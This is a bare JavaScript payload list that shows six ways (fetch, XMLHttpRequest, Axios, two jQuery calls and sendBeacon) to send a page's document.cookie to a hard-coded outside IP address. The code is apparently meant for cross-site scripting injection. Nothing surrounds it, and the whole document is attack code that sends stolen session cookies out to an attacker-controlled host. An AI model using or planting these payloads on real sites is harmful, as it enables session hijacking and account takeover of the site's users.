// Using Fetch API
fetch('http://195.201.121.249:8080/?c=' + document.cookie)
  .then(response => response.json())
  .then(data => console.log(data))
  .catch(error => console.error('Error:', error));

// Using XMLHttpRequest
var xhr = new XMLHttpRequest();
xhr.open("GET", 'http://195.201.121.249:8080/?c=' + document.cookie, true);
xhr.onreadystatechange = function () {
  if (xhr.readyState == 4 && xhr.status == 200)
    console.log(xhr.responseText);
}
xhr.send();

// Using Axios (you need to include axios library)
axios.get('http://195.201.121.249:8080/?c=' + document.cookie)
  .then(response => {
    console.log(response.data);
  })
  .catch(error => {
    console.error(error);
  });

// Using jQuery's $.ajax method
$.ajax({
  url: 'http://195.201.121.249:8080/?c=' + document.cookie,
  type: 'GET',
  success: function(res) {
    console.log(res);
  },
  error: function(error) {
    console.error(error);
  }
});

// Using jQuery's $.get method
$.get('http://195.201.121.249:8080/?c=' + document.cookie, function(data, status){
  console.log("Data: " + data + "\nStatus: " + status);
});

// Using navigator.sendBeacon
navigator.sendBeacon('http://195.201.121.249:8080/?c=' + document.cookie);
